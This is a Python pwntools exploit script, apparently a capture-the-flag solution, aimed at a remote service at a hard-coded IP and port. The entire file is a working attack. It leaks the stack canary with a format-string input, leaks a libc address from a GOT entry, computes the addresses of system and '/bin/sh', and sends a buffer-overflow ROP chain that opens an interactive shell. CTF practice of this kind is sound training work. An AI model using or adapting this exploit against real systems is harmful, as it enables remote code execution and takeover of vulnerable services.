from pwn import *

io = remote("123.60.135.228", 2054)
# elf = ELF('./polar-choose')

# 泄露canary
io.recvuntil("overflow\n")
print("ok1")
sleep(1)
io.sendline(b"1")
io.sendline(b'%11$p')
print('ok1')
sleep(1)
canary = int(io.recvline()[:-1].decode(), 16)
print('ok1')
sleep(1)
print(hex(canary))
print('ok1')
sleep(1)


# leak_libc
ret = 0x04005f1
pop_rdi = 0x0400a93

# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# print("puts_got:", hex(puts_got))
# print("puts_plt", hex(puts_plt))
puts_plt = 0x400610
puts_got = 0x601018
setvbuf_got = 0x0601040
read_got = 0x0601030
printf_got = 0x0601028

io.recvuntil("overflow")
print("ok2")
sleep(1)
io.sendline(b"2")
print('ok2')
sleep(1)
io.sendline(str(setvbuf_got))
print('ok2')
sleep(1)
print(io.recvline())
puts_addr = u64(io.recvline(1)[:-1].ljust(8, b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - 0x6f6a0
system = libc_base + 0x453a0
binsh = libc_base + 0x18ce57

# 溢出
padding = 0x30 - 8
payload = b'a' * padding
payload += p64(canary)
payload += b'a' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

io.recvuntil("overflow")
print("ok3")
sleep(1)
io.sendline(b"3")
print('ok3')
sleep(1)
io.send(payload)
print('ok3')
sleep(1)

io.interactive()